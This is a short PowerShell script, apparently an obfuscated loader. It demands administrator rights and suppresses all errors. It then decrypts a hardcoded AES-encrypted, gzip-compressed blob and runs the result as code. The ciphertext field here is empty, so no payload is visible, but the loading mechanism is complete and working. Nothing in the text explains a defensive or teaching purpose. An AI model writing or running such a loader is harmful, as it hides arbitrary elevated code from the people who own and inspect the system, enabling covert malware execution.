#Requires -RunAsAdministrator
#Requires -Version 5.1
$ErrorActionPreference = 'SilentlyContinue'

$k = [System.Convert]::FromBase64String('41zppyEbm+eYN3Xz/Fm5S140NVqy2YMp0ThgXI54K30=')
$i = [System.Convert]::FromBase64String('zP1bBdfINXqvY5W1+B39Yw==')
$c = [System.Convert]::FromBase64String('')
$a = [System.Security.Cryptography.Aes]::Create()
$d = $a.CreateDecryptor($k, $i).TransformFinalBlock($c, 0, $c.Length)
$m = New-Object System.IO.MemoryStream(, $d)
$z = New-Object System.IO.Compression.GZipStream($m, [System.IO.Compression.CompressionMode]::Decompress)
$o = New-Object System.IO.MemoryStream
$z.CopyTo($o)
$s = [System.Text.Encoding]::UTF8.GetString($o.ToArray())

& ([scriptblock]::Create($s))